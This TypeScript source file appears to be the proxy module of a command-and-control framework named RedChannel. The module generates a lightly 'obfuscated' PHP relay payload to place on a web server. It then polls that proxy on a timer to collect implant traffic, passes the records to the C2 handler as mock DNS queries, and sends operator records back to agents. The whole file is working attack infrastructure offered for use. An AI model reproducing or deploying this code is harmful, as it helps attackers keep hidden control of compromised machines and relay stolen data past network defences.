import axios from "axios";
import querystring from "querystring";
import * as fs from "fs";
import * as crypto from "crypto";
import { Constants, emsg } from "../utils/utils";
import BaseModule, { ExecuteReturn, ExecuteCallbackFunction } from "./base";
import Logger from "../lib/logger";
import RedChannel, { C2AnswerType, C2MessageRequest, C2MessageResponse } from "../lib/redchannel";

const MODULE_DESCRIPTION = "manage the proxy configuration";

const PROXY_PAYLOAD_PATH = "payloads/proxy.php";

const DEFAULT_CONFIG: ProxyModuleConfig = {
    enabled: true,
    key: crypto.randomBytes(6).toString("hex"),
    interval: 2000,
    obfuscate_payload: false,
    url: "http://127.0.0.1/",
};

export enum ProxyStatus {
    ERROR_KEY_MISMATCH = "ERR 1",
    ERROR_KEY_MISSING = "ERR 2",
    ERROR_INVALID_AGENT_ID = "ERR 3",
    ERROR_INVALID_DATA_SENT = "ERR 5",
    ERROR_INVALID_REQUEST = "ERR 6",
    ERROR_WRITING_TO_AGENT_STORAGE = "ERR 7",
    ERROR_WRITING_TO_C2_STORAGE = "ERR 8",
    OK_RECEIVED_FROM_AGENT = "OK PA",
    OK_RECEIVED_FROM_C2 = "OK PC",
    OK_NO_DATA = "OK ND",
}

export type ProxyModuleConfig = {
    enabled: boolean;
    url: string;
    key: string;
    interval: number;
    obfuscate_payload: boolean;
};

export default class ProxyModule extends BaseModule {
    fetchTimer: NodeJS.Timeout | null;
    log: Logger;
    payload: string;
    config: ProxyModuleConfig;

    constructor(
        protected redChannel: RedChannel,
        mergeConfig: Partial<ProxyModuleConfig>,
        protected proxyOnSuccessCallback?: ExecuteCallbackFunction,
        protected proxyOnErrorCallback?: ExecuteCallbackFunction
    ) {
        super("proxy", redChannel.configFile, mergeConfig);
        this.log = new Logger();

        this.description = MODULE_DESCRIPTION;

        this.fetchTimer = null;
        this.payload = "";

        this.config = this.resetConfig(DEFAULT_CONFIG);

        this.defineCommands({
            fetch: {
                arguments: [],
                description: "force a fetch from the proxy",
                execute: this.proxyFetch,
            },
            generate: {
                arguments: [],
                description: "generate proxy payload with the specified key",
                execute: this.run,
            },
            start: {
                arguments: [],
                description: "start the proxy checkin",
                execute: this.proxyFetchLoop,
            },
            stop: {
                arguments: [],
                description: "stop the proxy checkin",
                execute: () => {
                    if (this.fetchTimer) {
                        clearTimeout(this.fetchTimer);
                    }
                    return { message: "stopping the proxy checkin" };
                },
            },
            payload: {
                arguments: [],
                description: "get the current generated payload",
                execute: () => {
                    return { message: this.payload };
                },
            },
            "set url": {
                arguments: ["<url>"],
                description: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
                validateRegex: Constants.VALID_URL_REGEX,
                execute: (params: string) => {
                    this.config.url = params;
                },
            },
            "set enabled": {
                arguments: ["<1|0>"],
                description: "enable or disable proxy communication channel, remember to 'start' after enabling",
                execute: (params: string) => {
                    this.config.enabled = params != "0" && params != "false" ? true : false;
                },
            },
            "set obfuscate_payload": {
                arguments: ["<1|0>"],
                description: "enable or disable payload obfuscation",
                execute: (params: string) => {
                    this.config.obfuscate_payload = params != "0" && params != "false" ? true : false;
                },
            },
            "set key": {
                arguments: ["<key>"],
                description: "key to use for proxy communication",
                execute: (params: string) => {
                    this.config.key = params;
                },
            },
            "set interval": {
                arguments: ["<ms>"],
                description: "how often to fetch data from proxy, in ms",
                execute: (params: string) => {
                    this.config.interval = Number(params) || this.config.interval;
                },
            },
        });
    }

    run(): ExecuteReturn {
        if (!this.config.key) throw new Error(`proxy key is required, see 'help'`);

        let data: Buffer;
        let proxyPhp = "";
        try {
            data = fs.readFileSync(PROXY_PAYLOAD_PATH);
            proxyPhp = data.toString();
        } catch (ex) {
            throw new Error(`failed to generate payload: ${emsg(ex)}`);
        }

        const proxyErrorKeys = Object.keys(ProxyStatus);
        for (const keyIndex in proxyErrorKeys) {
            const re = new RegExp(`\\[${proxyErrorKeys[keyIndex]}\\]`, "g");
            proxyPhp = proxyPhp.replace(re, (ProxyStatus as any)[proxyErrorKeys[keyIndex]]);
        }
        proxyPhp = proxyPhp.replace(/\[PROXY_KEY\]/, this.config.key);
        proxyPhp = proxyPhp.replace(/\/\/.+/g, "");
        proxyPhp = proxyPhp.replace(/<\?php/g, "");
        proxyPhp = proxyPhp.replace(/\?>/g, "");

        // "obfuscation"
        if (this.config.obfuscate_payload) {
            proxyPhp = proxyPhp.replace(/\n/g, "");
            proxyPhp = proxyPhp.replace(/\s{2,}/g, "");
        }

        this.payload = `<?php ${proxyPhp} ?>`;
        return { message: `proxy payload set: \n${this.payload}` };
    }

    async sendToProxy(agentId: string, records: string[]) {
        const recordsString = `${records.join(";")};`;

        // console.log("* sending data to proxy: " + str_data);
        const data = {
            d: recordsString,
            k: this.config.key,
            i: agentId,
            p: "c",
        };

        try {
            const res = await axios.post(this.config.url, querystring.stringify(data));
            const message = `proxy send response: ${res.data}`;
            if (this.proxyOnSuccessCallback) this.proxyOnSuccessCallback({ message: message });
            else this.log.debug(message);
        } catch (ex) {
            const message = `proxy send failed: ${emsg(ex)}`;
            if (this.proxyOnErrorCallback) this.proxyOnErrorCallback({ message: message });
            else this.log.error(message);
        }
        return;
    }

    getFromProxy() {
        if (!this.config.enabled) {
            this.log.error(`proxy is not enabled: try 'set enabled 1'`);
            return;
        }

        if (!this.config.url) {
            this.log.error(`proxy config is missing the url: see 'help'`);
            return;
        }
        if (!this.config.key) {
            this.log.error(`proxy config is missing a key: see 'help'`);
            return;
        }

        const data = {
            k: this.config.key,
            f: "a",
        };

        return axios
            .post(this.config.url, querystring.stringify(data))
            .then((result) => this.processProxyData(result.data))
            .catch((ex) => {
                const message = `proxy fetch failed: ${emsg(ex)}`;
                if (this.proxyOnErrorCallback) this.proxyOnErrorCallback({ message: message });
                else this.log.error(message);
            });
    }

    processProxyData(proxyData: string) {
        // we expect the proxy to respond with ERR 1, or similar
        // this.log.debug(`proxy response:\n${proxyData}`);
        if (proxyData.length < 2) throw new Error(`unexpected response (too small): '${proxyData}'`);

        // everything was ok, but no data from agents in proxy storage
        if (proxyData === ProxyStatus.OK_NO_DATA) return;

        if (!Constants.VALID_PROXY_DATA.test(proxyData)) throw new Error(`invalid incoming proxy data: '${proxyData}'`);

        // a known error was throw
        if (Object.values(ProxyStatus).includes(proxyData as ProxyStatus)) {
            const codeName = Object.keys(ProxyStatus)[Object.values(ProxyStatus).indexOf(proxyData as ProxyStatus)];
            throw new Error(`proxy returned code ${codeName}`);
        }

        // grab proxy response and build mock dns queries
        let data = proxyData.replace(/;$/, "").split(";");
        data.forEach((q) => {
            let req: C2MessageRequest = {
                connection: {
                    remoteAddress: this.config.url,
                    type: C2AnswerType.TYPE_PROXY,
                },
            };
            let res: C2MessageResponse = {
                question: [
                    {
                        type: C2AnswerType.TYPE_PROXY,
                        name: `${q}.${this.redChannel.modules.c2.config.domain}`,
                    },
                ],
                answer: [],
                end: () => {},
            };
            this.redChannel.c2MessageHandler.bind(this.redChannel)(req, res);
        });
    }

    proxyFetch() {
        this.getFromProxy();
        return { message: "fetching data from proxy..." };
    }

    proxyEnable() {
        const message = this.config.enabled ? `starting proxy checkin at interval: ${this.config.interval}ms` : `stopping proxy checkin`;

        this.proxyFetchLoop();
        return { message: message };
    }

    proxyFetchLoop(): ExecuteReturn {
        if (this.fetchTimer) clearTimeout(this.fetchTimer);
        if (!this.config.enabled) return { message: "proxy is not enabled" };

        if (!this.config.url) {
            throw new Error(`proxy config is missing the url: see 'help'`);
        }
        if (!this.config.key) {
            throw new Error(`proxy config is missing a key: see 'help'`);
        }

        this.getFromProxy()?.finally(() => {
            this.fetchTimer = setTimeout(() => {
                this.proxyFetchLoop();
            }, this.config.interval);
        });

        return { message: "starting the proxy checkin loop" };
    }
}
